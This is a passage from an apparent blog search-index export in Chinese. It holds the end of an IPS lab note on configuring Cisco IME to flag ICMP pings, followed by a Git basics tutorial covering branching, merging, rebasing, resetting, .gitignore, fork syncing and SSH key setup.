<li>R1(f 1/0)-&gt; SW(1)</li>
<li>R2(f 1/0)-&gt; SW(2)</li>
<li>IDS -&gt; SW(3)</li>
<li>IDS -&gt; SW(4)</li>
</ul>
<h5 id="拓扑配置"><a href="#拓扑配置" class="headerlink" title="拓扑配置"></a>拓扑配置</h5><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>IME中配置接口对（mypair）<ul>
<li>Configuration -&gt; Interface Pairs -&gt; Add -&gt; 选取一对接口 -&gt; 开启</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AEmypair.png" alt="IME--IPS配置mypair"></p>
<ul>
<li>绑定病毒特征识别库Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; mypair</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPS绑定病毒特征识别库Sig0"></p>
<ul>
<li><p>划分VLAN</p>
<ul>
<li>SW<ul>
<li>端口1、3属于VLAN2</li>
<li>端口2、4属于VLAN3</li>
</ul>
</li>
</ul>
</li>
<li><p>连通性：R1 -&gt; ping 10.1.1.2 -&gt; R2是否连通</p>
</li>
</ul>
<h5 id="入侵检测-1"><a href="#入侵检测-1" class="headerlink" title="入侵检测"></a>入侵检测</h5><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>配置病毒特征识别库Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPS配置病毒特征识别库Sig0"></p>
<ul>
<li>监控IPS-ICMP事件<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS-ICMP%E4%BA%8B%E4%BB%B6.png" alt="IME--IPS监控IPS-ICMP事件"></p>
<ul>
<li>R1向R2发生ICMP Echo Requset的Ping包，查看IME–IPS的Event Viewer有无报警日志</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS%E4%BA%8B%E4%BB%B6.png" alt="IME--IPS监控IPS事件"> </p>
]]></content>
      <categories>
        <category>IPS</category>
      </categories>
  </entry>
  <entry>
    <title>Git基础</title>
    <url>/2020/07/12/git_base/</url>
    <content><![CDATA[<hr>
<h2 id="Git基础"><a href="#Git基础" class="headerlink" title="Git基础"></a>Git基础</h2><ul>
<li>什么是Git<ul>
<li>Git中的数据库</li>
</ul>
</li>
<li>Git的基本操作<ul>
<li>安装Git</li>
<li>Git的基本命令</li>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Git的分支<ul>
<li>Git分支操作</li>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Git的合并<ul>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Git的回滚撤销<ul>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>gitignore/fork同步<ul>
<li>Git-tutorial Repository</li>
</ul>
</li>
<li>Git的免密传送<ul>
<li>Git传输的协议</li>
<li>SSH协议登陆</li>
</ul>
</li>
<li>Git的工作流</li>
<li>常用工具</li>
</ul>
<h3 id="0X00-什么是Git"><a href="#0X00-什么是Git" class="headerlink" title="0X00 什么是Git"></a>0X00 什么是Git</h3><ul>
<li>分布式版本管理系统<ul>
<li>最初是为了管理Linux的系统内核</li>
<li>同FTP相同的功能</li>
<li>非线性管文件</li>
<li>速度快</li>
<li>对待数据更像一个快照流</li>
<li>可以在无网络的情况下进行提交到本地服务器，在有网络的情况下提交给远端的服务器</li>
</ul>
</li>
</ul>
<p><img src="/images/git/1-Git-Server-and-Computer.PNG" alt="1-Git-Server and Computer"></p>
<ul>
<li>方式：直接记录快照而非方式，每次修改需要一次Commit</li>
<li>保证完整性：计算校验和（哈希算法），Git存取的是哈希值</li>
</ul>
<p><img src="/images/git/1-Git--Snaphost.PNG" alt="1-Git--Snaphost"></p>
<p><img src="/images/git/1-Git--%E5%AE%8C%E6%95%B4%E6%80%A7.PNG" alt="1-Git--完整性"></p>
<h5 id="Git中的数据库"><a href="#Git中的数据库" class="headerlink" title="Git中的数据库"></a>Git中的数据库</h5><ul>
<li>Git仓库–.git directory：保存项目数据，元数据的地方，git自己维护的文件夹</li>
<li>工作目录–Working Directory：内容自Git仓库，对当前项目某一版本独立提取出来的内容</li>
<li>暂存区–Staging Area：保存下次提交的文件目录，也算是一个索引</li>
<li>三个概念<ul>
<li>已提交：Git目录中保存着的特定版本文件</li>
<li>已暂存：做了修改并放在暂存区</li>
<li>已修改：做了修改但还没有放到暂存区</li>
</ul>
</li>
<li>远程仓库–Remote：多人操作的仓库</li>
</ul>
<p><img src="./images/git/1-Git%E4%BB%93%E5%BA%93-1.PNG" alt="1-Git仓库-1"></p>
<p><img src="./images/git/1-Git%E4%BB%93%E5%BA%93-2.PNG" alt="1-Git仓库-2"></p>
<h3 id="0X01-Git的基本操作"><a href="#0X01-Git的基本操作" class="headerlink" title="0X01 Git的基本操作"></a>0X01 Git的基本操作</h3><h5 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h5><ul>
<li>下载git OXS版本（一般为内置/brew install git安装）</li>
<li>下载git WindowS版本（Git网页下载Git）</li>
<li>下载git Linux版本（apt-get install git-all/yum -y install git）</li>
</ul>
<h5 id="Git的基本命令"><a href="#Git的基本命令" class="headerlink" title="Git的基本命令"></a>Git的基本命令</h5><ul>
<li>▲ 提交到远程仓库需要在Github上创建一个仓库</li>
<li>Git的版本<ul>
<li><strong><code>🔺命令：git version</code></strong></li>
</ul>
</li>
<li>Git的用户信息<ul>
<li>名字：<strong><code>🔺命令：git config --global user.name &quot;tomas&quot;</code></strong></li>
<li>邮箱：<strong><code>🔺命令：git config --global user.email &quot;643008933@qq.com&quot;</code></strong></li>
<li>配置文件：~/.gitconfig（可设置代理，配置信息）</li>
</ul>
</li>
<li>Git的基本命令<ul>
<li>初始化：<strong><code>🔺命令：git init</code></strong></li>
<li>仓库状态：<strong><code>🔺命令：git status</code></strong></li>
<li>添加文件到暂存区管理：<strong><code>🔺命令：git add 文件名</code></strong><ul>
<li>-A，所有文件</li>
</ul>
</li>
<li>从暂存区删除文件：<strong><code>🔺命令：git rm --cacahe 文件名</code></strong></li>
<li>查看文件：<strong><code>🔺命令：..git → cat index</code></strong></li>
<li>提交：<strong><code>🔺命令：git commit -m &quot;文件名&quot;</code></strong><ul>
<li>-m：描述提交的内容</li>
</ul>
</li>
<li>建立连接：<strong><code>🔺命令：git remote add origin https://.....</code></strong></li>
<li>查看远端信息：<strong><code>🔺命令：git remote -v</code></strong></li>
<li>提交本地文件到远端服务器：<strong><code>🔺命令：git push origin master -u</code></strong><ul>
<li>origin：远端仓库名称</li>
<li>master：本地仓库名称</li>
<li>-u：后续不需要输入名称</li>
<li>:master ：删除远端的分支</li>
<li>master:m1 ：更改远端分支名称为m1</li>
</ul>
</li>
<li>克隆远程仓库到本地：<strong><code>🔺命令：git clone https://..... git-demo</code></strong><ul>
<li>git-demo：为拉取到本地仓库的名称</li>
</ul>
</li>
<li>拉取远端仓库修改数据到本地：<strong><code>🔺命令：git pull origin master</code></strong><ul>
<li>origin：远端仓库名称</li>
<li>master：本地仓库名称</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="Git-tutorial-Repository"><a href="#Git-tutorial-Repository" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>mkdir git-tutorial</li>
<li>cd git-tutorial</li>
<li>git init</li>
<li>ll</li>
<li>touch README.md</li>
<li>git status</li>
<li>git add README.md</li>
<li>git status</li>
<li>git rm –cacahe README.md</li>
<li>git status</li>
<li>git add README.md -A</li>
<li>git status</li>
<li>git commit -m “README.md”</li>
<li>git remote add origin <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>..</li>
<li>git remote -v</li>
<li>git push origin master -u</li>
<li>查看Github是否有新建一个仓库并有README.md</li>
<li>cd ..</li>
<li>git clone https://… git-demo</li>
<li>vim README.md</li>
<li>Hello world → wq</li>
<li>git status</li>
<li>git add README.md</li>
<li>git commit -m “modify README.md”</li>
<li>cd ..</li>
<li>cd git-tutorial</li>
<li>git pull origin master</li>
<li>查看Github建立的仓库中的README.md是否有内容</li>
</ul>
<h3 id="0X02-Git的分支"><a href="#0X02-Git的分支" class="headerlink" title="0X02 Git的分支"></a>0X02 Git的分支</h3><ul>
<li>版本发布、功能增加、错误修改</li>
</ul>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-1.PNG" alt="3-Git分支-1"></p>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-2.PNG" alt="3-Git分支-2"></p>
<ul>
<li>分支发布合并</li>
</ul>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-3.PNG" alt="3-Git分支-3"></p>
<h5 id="Git分支操作"><a href="#Git分支操作" class="headerlink" title="Git分支操作"></a>Git分支操作</h5><ul>
<li>创建分支：<strong><code>🔺命令：git branch 分支名</code></strong><ul>
<li>基于某个分支创建的分支，会复制其内容</li>
</ul>
</li>
<li>查看分支：<strong><code>🔺命令：git branch</code></strong></li>
<li>跳转分支：<strong><code>🔺命令：git checkout 分支名</code></strong>   </li>
<li>创建分支并跳转：<strong><code>🔺命令：git checkout -b 分支名</code></strong></li>
<li>删除分支：<strong><code>🔺命令：git branch -d 分支名</code></strong><ul>
<li>▲ 无合并到master的分支无法删除，或者使用-D参数`**</li>
</ul>
</li>
<li>合并分支：<strong><code>🔺命令：git merge 分支名</code></strong></li>
</ul>
<h5 id="Git-tutorial-Repository-1"><a href="#Git-tutorial-Repository-1" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>git branch feature1</li>
<li>git branch</li>
<li>git checkout feature1</li>
<li>touch a.txt</li>
<li>vim a.txt</li>
<li>this is a.txt → wq</li>
<li>git add a.txt</li>
<li>git commit -m “a.txt”</li>
<li>git branch feature2</li>
<li>git checkout feature2</li>
<li>git checkout -b feature3</li>
<li>git branch</li>
<li>git branch -d feature2</li>
<li>touch b.txt</li>
<li>vim b.txt</li>
<li>this is b.txt → wq</li>
<li>git add b.txt</li>
<li>git commit -m “b.txt”</li>
<li>git checkout master</li>
<li>git branch -d feature3</li>
<li>git merge feature3</li>
<li>git push</li>
<li>查看Github仓库是否有a.txt和b.txt，但无其他分支</li>
<li>git branch feature1</li>
<li>git push origin feature1</li>
<li>查看Github仓库是否有feature1分支</li>
<li>git push origin :feature1</li>
<li>查看Github仓库是否无feature1分支</li>
<li>git push origin feature1:f1</li>
<li>查看Github仓库的feature1是否更改为f1</li>
</ul>
<h3 id="0X03-Git的合并"><a href="#0X03-Git的合并" class="headerlink" title="0X03 Git的合并"></a>0X03 Git的合并</h3><ul>
<li>▲ 可以在Stackoverflow上看git log多样格式</li>
<li>▲ rebase的黄金法则：绝对不要在公共分支使用rebase</li>
<li>查看日志：git log<ul>
<li>–oneline：一行的提交信息</li>
<li>–oneline -3：只取前面3行</li>
</ul>
</li>
<li>查看添加的内容：<strong><code>🔺命令：git show 哈希值</code></strong></li>
<li>查看提交方式：<strong><code>🔺命令：git merge --help</code></strong><ul>
<li>–ff（fast-forward）：默认不产生一次commit</li>
<li>–no-ff：产生一个commit</li>
</ul>
</li>
<li>移动分支，并将master分支的提交并入：<strong><code>🔺命令：git rebase</code></strong></li>
<li>查看版本分支报错情况：<strong><code>🔺命令：git mergetool</code></strong><ul>
<li>通过工具修改后，会生成一个x.txt.orig，保存冲突的现场</li>
</ul>
</li>
</ul>
<blockquote>
<p>   merge和rebase<br>   merge：两个分支的修改提交，默认不提交，关注点在合并操作上<br>   rebase：将当前分支做的修改，复制在目标分支的最后一次中，关注点在开发的过程上 </p>
</blockquote>
<h5 id="Git-tutorial-Repository-2"><a href="#Git-tutorial-Repository-2" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>git branch -d f1</li>
<li>git push origin :f1</li>
<li>git log</li>
<li>q</li>
<li>git log –oneline</li>
<li>git log –oneline -3</li>
<li>git show d156c23</li>
<li>vi ~/.config → dog = log –all –decorate –oneline –graph</li>
<li>git dog</li>
<li>git checkout -b f1</li>
<li>touch fa.txt</li>
<li>git add fa.txt</li>
<li>git commit -m “add fa”</li>
<li>git dog</li>
<li>git checkout master</li>
<li>git merge f1</li>
<li>git dog</li>
<li>git checkout f1</li>
<li>touch fb.txt</li>
<li>git commit -m “add fb”</li>
<li>git checkout f1</li>
<li>git merge f1 –no-ff</li>
<li>git dog</li>
<li>git push</li>
<li>git push origin f1</li>
<li>远程修改master中的a.txt</li>
<li>git pull</li>
<li>git checkout f1</li>
<li>git merge master</li>
<li>git dog</li>
<li>git checkout master</li>
<li>touch m1.txt</li>
<li>git add m1.txt</li>
<li>git commit -m “add m1”</li>
<li>git checkout f1</li>
<li>git dog</li>
<li>git rebase</li>
<li>git dog</li>
<li>git checkout -b f2</li>
<li>vim a.txt</li>
<li>this is b.txt</li>
<li>git add a.txt</li>
<li>git commit -m “update a.txt”</li>
<li>git checkout f1</li>
<li>vi a.txt</li>
<li>this is c.txt</li>
<li>git add a.txt</li>
<li>git commit -m “update c.txt”</li>
<li>git checkout f2</li>
<li>git merge f1</li>
<li>cat a.txt</li>
<li>git mergetool</li>
<li>rm a.txt.orig</li>
<li>git commit -m “update a.txt”</li>
<li>git dog</li>
</ul>
<h3 id="0X04-Git的回滚撤销"><a href="#0X04-Git的回滚撤销" class="headerlink" title="0X04 Git的回滚撤销"></a>0X04 Git的回滚撤销</h3><ul>
<li>返回前一次的记录：<strong><code>🔺命令：git reset master^/~5/hash值id</code></strong><ul>
<li>^：每一个^符号标识[前一次]，如^^^表示回退三次</li>
<li><del>：回退次数加在后面，如</del>5</li>
<li>hash值id：回退到id号的版本</li>
<li>–mix：把暂存区的文件丢弃，但不会动到工作目录的文件（默认方式）</li>
<li>–soft：工作目录跟暂存区的文件都不会被丢弃</li>
<li>–hard：不管是工作目录以及暂存区的文件都会丢弃</li>
</ul>
</li>
<li>所有的日志文件：<strong><code>🔺命令：git reflog</code></strong></li>
<li>撤销某次操作：<strong><code>🔺命令：git revert</code></strong><ul>
<li>此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交</li>
</ul>
</li>
<li>▲ 在公用分支上应用revert，在私用分支上用reset</li>
</ul>
<blockquote>
<pre><code>reset和revert
revert：用一次新的commit来回滚之前的commit
reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre></blockquote>
<h5 id="Git-tutorial-Repository-3"><a href="#Git-tutorial-Repository-3" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>touch hello.java</li>
<li>git add hello.java</li>
<li>git commit -m “hellp.java”</li>
<li>git dog</li>
<li>git reset master^</li>
<li>git status</li>
<li>ll</li>
<li>git add hello.java</li>
<li>git commit -m “add Hello.java”</li>
<li>git dog</li>
<li>git reset cd0309f</li>
<li>git status</li>
<li>git reset –hard 7d37397</li>
<li>git status</li>
<li>ll</li>
<li>touch c.txt</li>
<li>git add c.txt</li>
<li>git commit -m “add c.txt”</li>
<li>git dog</li>
<li>git reset –soft 7d37397</li>
<li>git status</li>
<li>git reflog</li>
<li>git reset –hard 00bd027</li>
<li>ll</li>
<li>git rest –hard HEAD</li>
<li>git dog</li>
<li>git revert</li>
<li>git log</li>
<li>git revert hash值id（Commit的ID）</li>
<li>git dog</li>
</ul>
<h3 id="0X05-gitignore-fork同步"><a href="#0X05-gitignore-fork同步" class="headerlink" title="0X05 gitignore/fork同步"></a>0X05 gitignore/fork同步</h3><ul>
<li>创建一个.gitignore文件，保存要忽略的内容<ul>
<li>忽略系统生成的文件，如IDE的配置</li>
<li>忽略编译生成的中间文件、可执行文件等</li>
<li>忽略敏感的配置文件和本地不想提交的脚本</li>
</ul>
</li>
<li>常用参数<ul>
<li>配置文件：.settings/</li>
<li>脚本文件：*.sh</li>
<li>上次所有txt文件：!*.txt</li>
<li>某个目录：/a/*.class</li>
</ul>
</li>
<li>gitignore网站：<a href="https://www.gitignore.io" target="_blank" rel="noopener">https://www.gitignore.io</a></li>
<li>查看远程的版本信息：<strong><code>🔺命令：git remote -v</code></strong></li>
<li>增加一个远程仓库上传流：<strong><code>🔺命令：git remote add upstream https://...</code></strong></li>
<li>更新远程仓库的版本：<strong><code>🔺命令：git fetch upstream 分支名</code></strong><ul>
<li>分支名默认省略，则为master分支</li>
<li>▲ pull = fetch + merge</li>
</ul>
</li>
<li>查看远程原始仓库的分支：<strong><code>🔺命令：git branch -r</code></strong></li>
</ul>
<h5 id="Git-tutorial-Repository-4"><a href="#Git-tutorial-Repository-4" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>git add -A .</li>
<li>git commit -m “add gitignore”</li>
<li>git push -f</li>
<li>git clone https://……awesome</li>
<li>cd awesome</li>
<li>git remote -v</li>
<li>git remote add upstream https://…</li>
<li>git remote -v</li>
<li>git fetch upstream </li>
<li>git branch -r</li>
<li>git rebase upstream/master<ul>
<li>merge关注的是提交的历史，将两次操作合并，但无提交数据，rebase则足够</li>
</ul>
</li>
<li>git push</li>
<li>git log</li>
</ul>
<h3 id="0X06-Git的免密传送"><a href="#0X06-Git的免密传送" class="headerlink" title="0X06 Git的免密传送"></a>0X06 Git的免密传送</h3><h5 id="Git传输的协议"><a href="#Git传输的协议" class="headerlink" title="Git传输的协议"></a>Git传输的协议</h5><ul>
<li>local协议</li>
<li>HTTP(S)协议：需要输入账号密码</li>
<li>SSH协议：不需要输入账号密码</li>
<li>Git协议</li>
<li><a href="https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">Git免密推送</a></li>
</ul>
<h5 id="SSH协议登陆"><a href="#SSH协议登陆" class="headerlink" title="SSH协议登陆"></a>SSH协议登陆</h5><ul>
<li>在个人界面的Settings处</li>
<li>SSH and GPG keys</li>
<li>generating SSH keys</li>
<li>Generating a new SSH key and adding it to the ssh-agent</li>
<li>Windows<ul>
<li>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:643008933@qq.com" target="_blank" rel="noopener">643008933@qq.com</a>“<ul>
<li>Enter a file in which to save the key (/c/Users/you/.ssh/id_rsa):[Press enter]</li>
<li>Enter passphrase (empty for no passphrase): [Type a passphrase]</li>
<li>Enter same passphrase again: [Type passphrase again]</li>
</ul>
</li>
<li>eval $(ssh-agent -s)</li>
<li>ssh-add ~/.ssh/id_rsa</li>
<li>cat ~/.ssh/id_rsa.public</li>
<li>复制公钥到New SSH Key</li>
</ul>
</li>
<li>git clone with SSH</li>
<li>touch a.txt</li>
<li>git add a.txt</li>
<li>git commit -m “add a.txt”</li>
<li>git push（看是否需要账号密码登陆）</li>
<li>▲ 2020.04.14 使用SSH协议登陆<ul>
<li>git remote -v：查看git clone方式，如果是origin <a href="https://github.com......开头就说明需要调整" target="_blank" rel="noopener">https://github.com......开头就说明需要调整</a></li>
<li>git remote rm origin：移除原来的git源</li>
<li>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:xxx.git：添加新的git源头（地址修改为要调整的）</li>
<li>git remote -v：再查看git方式，如果是origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>….就开头就说明OK了，重新commit或者push就不用每次都输入账号密码了</li>
</ul>
</li>
</ul>
<h3 id="0X07-Git的工作流"><a href="#0X07-Git的工作流" class="headerlink" title="0X07 Git的工作流"></a>0X07 Git的工作流</h3><ul>
<li><a href="https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md" target="_blank" rel="noopener">Git工作流指南</a></li>
<li>集中式工作流</li>
<li>功能分支工作流</li>
<li>Gitflow工作流</li>
<li>Forking工作流</li>
</ul>
<h3 id="0X08-常用工具"><a href="#0X08-常用工具" class="headerlink" title="0X08 常用工具"></a>0X08 常用工具</h3><ul>
<li>sourcetree</li>
<li>vscode</li>
<li>git图标：<a href="https://gitmoji.surge.sh" target="_blank" rel="noopener">https://gitmoji.surge.sh</a></li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
  </entry>
</search>
